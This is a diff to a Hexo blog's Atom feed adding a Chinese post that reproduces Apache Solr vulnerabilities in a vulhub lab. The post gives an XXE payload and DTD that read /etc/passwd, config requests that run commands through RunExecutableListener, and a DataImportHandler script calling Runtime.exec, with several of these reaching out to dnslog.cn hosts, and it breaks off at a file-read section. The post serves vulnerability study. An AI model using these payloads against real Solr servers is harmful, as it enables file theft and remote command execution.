@@ -3,31 +3,155 @@
     <id>http://example.com</id>
     <title>Milkii0的秘密花园</title>
     <link href="http://example.com" />
-    <updated>2022-01-16T03:14:59.000Z</updated>
-    <category term="Java反序列化" />
-    <category term="ysoserial调试" />
-    <category term="文件上传靶场" />
+    <updated>2022-06-10T01:10:46.000Z</updated>
     <category term="web,HTTP" />
     <category term="redis,未授权,漏洞利用" />
+    <category term="solr, 漏洞复现" />
     <category term="前后端分离" />
+    <category term="文件上传靶场" />
+    <category term="Java反序列化" />
+    <category term="ysoserial调试" />
     <category term="木马,汇总" />
     <category term="pikachu,web靶场" />
-    <category term="webgoat" />
     <category term="dorabox,靶场练习" />
     <category term="sql注入靶场" />
+    <category term="webgoat" />
     <entry>
-        <id>http://example.com/2022/01/16/stjc/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/</id>
+        <id>http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
+        <title>solr漏洞复现</title>
+        <link rel="alternate" href="http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+        <content type="html">&lt;h1 id=&#34;solr是什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#solr是什么&#34;&gt;#&lt;/a&gt; solr 是什么&lt;/h1&gt;
+&lt;p&gt;Solr 是开源的，基于 Lucene Java 的搜索服务器。&lt;/p&gt;
+&lt;p&gt;易于加入到 Web 应用程序中，会生成基于 HTTP 的管理界面。&lt;br&gt;
+后台管理界面 Dashboard 仪表盘中，可查看当前 Solr 的版本信息。&lt;br&gt;
+(概念详解，移步传送门)&lt;/p&gt;
+&lt;h1 id=&#34;环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境&#34;&gt;#&lt;/a&gt; 环境&lt;/h1&gt;
+&lt;p&gt;漏洞复现环境均使用 vulhub 中的环境&lt;/p&gt;
+&lt;h1 id=&#34;cve-2017-12629-xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2017-12629-xxe&#34;&gt;#&lt;/a&gt; CVE-2017-12629-XXE&lt;/h1&gt;
+&lt;h2 id=&#34;影响版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
+&lt;p&gt;Apache Solr &amp;lt; 7.1&lt;br&gt;
+Apache Lucene &amp;lt; 7.1&lt;/p&gt;
+&lt;h2 id=&#34;复现过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
+&lt;p&gt;启动环境后打开管理界面：&lt;a href=&#34;http://192.168.77.128:8983/solr/#/&#34;&gt;http://192.168.77.128:8983/solr/#/&lt;/a&gt;&lt;br&gt;
+solr-spec 版本：7.0.1，lucene-spec 版本：7.0.1，符合漏洞要求&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../_resources/bd2a3461fc7bccc9854dd362e359e6c9.png&#34; alt=&#34;bd2a3461fc7bccc9854dd362e359e6c9.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用外部实体读取敏感文件信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用外部实体读取敏感文件信息&#34;&gt;#&lt;/a&gt; 利用外部实体读取敏感文件信息&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;开一个 web 服务，在下面创建一个 1.dtd 文件，文件内容如下&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///etc/passwd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;ent&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;&amp;lt;!ENTITY data SYSTEM &amp;#x27;:%file;&amp;#x27;&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;读取 Linux 下 /etc/passwd 文件信息&lt;br&gt;
+引用外部实体&lt;br&gt;
+ payload： &lt;code&gt;http://192.168.77.128:8983/solr/demo/select?&amp;amp;q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.77.128%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;amp;wt=xml&amp;amp;defType=xmlparser&lt;/code&gt; &lt;br&gt;
+URL 解码后：&lt;br&gt;
+ &lt;code&gt;http://192.168.77.128:8983/solr/demo/select?&amp;amp;q=&amp;lt;?xml+version=&amp;quot;1.0&amp;quot;+?&amp;gt;&amp;lt;!DOCTYPE+root[&amp;lt;!ENTITY+%+ext+SYSTEM+&amp;quot;http://192.168.77.128/1.dtd&amp;quot;&amp;gt;%ext;%ent;]&amp;gt;&amp;lt;r&amp;gt;&amp;amp;data;&amp;lt;/r&amp;gt;&amp;amp;wt=xml&amp;amp;defType=xmlparser&lt;/code&gt; &lt;br&gt;
+ 执行 payload，获取文件信息成功&lt;br&gt;
+&lt;img src=&#34;../_resources/7053300facb7c69236631c1d082a1013.png&#34; alt=&#34;7053300facb7c69236631c1d082a1013.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;本地dtd读取文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#本地dtd读取文件&#34;&gt;#&lt;/a&gt; 本地 DTD 读取文件&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/83713259&#34;&gt;XXE 之利用本地 DTD 进行文件读取&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;cve-2017-12629-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2017-12629-rce&#34;&gt;#&lt;/a&gt; CVE-2017-12629-RCE&lt;/h1&gt;
+&lt;h2 id=&#34;影响版本-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-2&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
+&lt;p&gt;Apache Solr &amp;lt; 7.1&lt;br&gt;
+Apache Lucene &amp;lt; 7.1&lt;/p&gt;
+&lt;h2 id=&#34;复现过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-2&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
+&lt;p&gt;触发命令执行的事件有两种：postCommit 和 newSearcher&lt;/p&gt;
+&lt;h3 id=&#34;使用newsearcher&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用newsearcher&#34;&gt;#&lt;/a&gt; 使用 newSearcher&lt;/h3&gt;
+&lt;p&gt;其中 demo 为存在的 core 名称&lt;br&gt;
+数据包：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;add-listener&amp;quot; : &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;event&amp;quot;:&amp;quot;newSearcher&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;name&amp;quot;:&amp;quot;newlistener1&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;class&amp;quot;:&amp;quot;solr.RunExecutableListener&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;exe&amp;quot;:&amp;quot;ping&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;dir&amp;quot;:&amp;quot;/usr/bin/&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;args&amp;quot;:[&amp;quot;3pqsrm.dnslog.cn&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;../_resources/94b6a5f1b4ac9063e66287dcb8c4a904.png&#34; alt=&#34;94b6a5f1b4ac9063e66287dcb8c4a904.png&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;../_resources/1ad6af042c22a35b1a3f512ecdded65b.png&#34; alt=&#34;1ad6af042c22a35b1a3f512ecdded65b.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;使用postcommit&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用postcommit&#34;&gt;#&lt;/a&gt; 使用 postCommit&lt;/h3&gt;
+&lt;p&gt;数据包 1：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;add-listener&amp;quot; : &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;event&amp;quot;:&amp;quot;postCommit&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;name&amp;quot;:&amp;quot;newlistener3&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;class&amp;quot;:&amp;quot;solr.RunExecutableListener&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;exe&amp;quot;:&amp;quot;ping&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;dir&amp;quot;:&amp;quot;/usr/bin/&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;args&amp;quot;:[&amp;quot;3pqsrm.dnslog.cn&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;发送该请求后一直没有返回数据，取消重发会回显该 name 已经存在，所以发送第二个数据包&lt;br&gt;
+&lt;img src=&#34;../_resources/2127408f02166332e7024113d04771c7.png&#34; alt=&#34;2127408f02166332e7024113d04771c7.png&#34;&gt;&lt;br&gt;
+ 数据包 2 (数据随便输)：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/update HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.77.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&amp;#123;&amp;quot;id&amp;quot;:&amp;quot;test&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;../_resources/fd55bbc422425d1cc140a4b9c47bb275.png&#34; alt=&#34;fd55bbc422425d1cc140a4b9c47bb275.png&#34;&gt;&lt;br&gt;
+ 更新后发现两条记录都在（之前因为没有返回数据又试了一次）&lt;br&gt;
+&lt;img src=&#34;../_resources/87bd83e9378424bd1f9371d9d213a4c8.png&#34; alt=&#34;87bd83e9378424bd1f9371d9d213a4c8.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;cve-2019-0193&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2019-0193&#34;&gt;#&lt;/a&gt; CVE-2019-0193&lt;/h1&gt;
+&lt;h2 id=&#34;影响版本-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-3&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
+&lt;p&gt;Apache solr &amp;lt; 8.2.0&lt;/p&gt;
+&lt;h2 id=&#34;复现过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-3&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
+&lt;p&gt;在 Apache solr 的可选模块 DatalmportHandler 中的 DIH 配置是可以包含脚本，因此存在安全隐患，在 apache solr &amp;lt; 8.2.0 版本之前 DIH 配置中 dataconfig 可以被用户控制&lt;/p&gt;
+&lt;p&gt;vulhub 环境下，进入后会让我们新建一个 core&lt;br&gt;
+&lt;img src=&#34;../_resources/ddc393bc282026e3dab3eda7d12be543.png&#34; alt=&#34;ddc393bc282026e3dab3eda7d12be543.png&#34;&gt;&lt;br&gt;
+ 我们需要在服务器中新建，这里新建会报错找不到配置文件&lt;br&gt;
+新建 test core 命令&lt;br&gt;
+ &lt;code&gt;docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db &lt;/code&gt; &lt;br&gt;
+&lt;img src=&#34;../_resources/4408b56e4ba62cde34034ac2e758e594.png&#34; alt=&#34;4408b56e4ba62cde34034ac2e758e594.png&#34;&gt;&lt;br&gt;
+ 刷新页面即可看见新建的 core&lt;br&gt;
+ 根据以下步骤进行代码执行&lt;br&gt;
+&lt;img src=&#34;../_resources/f3b7b2eac45cbc2012a1e0645496bc1f.png&#34; alt=&#34;f3b7b2eac45cbc2012a1e0645496bc1f.png&#34;&gt;&lt;br&gt;
+exp：&lt;/p&gt;
+&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dataConfig&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dataSource&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;URLDataSource&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;handlebars&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;          function poc()&amp;#123; java.lang.Runtime.getRuntime().exec(&amp;quot;ping 0ytihf.dnslog.cn&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;handlebars&#34;&gt;  ]]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;document&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;entity&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;stackoverflow&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;url&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;https://stackoverflow.com/feeds/tag/solr&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;processor&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;XPathEntityProcessor&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;forEach&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/feed&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;transformer&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;script:poc&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;document&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dataConfig&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;执行成功后，上方会出现绿色修勾勾&lt;br&gt;
+&lt;img src=&#34;../_resources/63a1299f3a6105014fe6ca0d077857d7.png&#34; alt=&#34;63a1299f3a6105014fe6ca0d077857d7.png&#34;&gt;&lt;br&gt;
+ 命令执行成功&lt;br&gt;
+&lt;img src=&#34;../_resources/c7aa99cb57448a243367095f5b1cd1af.png&#34; alt=&#34;c7aa99cb57448a243367095f5b1cd1af.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;remote-streaming-fileread任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#remote-streaming-fileread任意文件读取&#34;&gt;#&lt;/a&gt; Remote-Streaming-Fileread（任意文件读取）&lt;/h1&gt;
+&lt;h2 id=&#34;复现过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程-4&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;获取 cores&lt;/li&gt;
+&lt;/ol&gt;
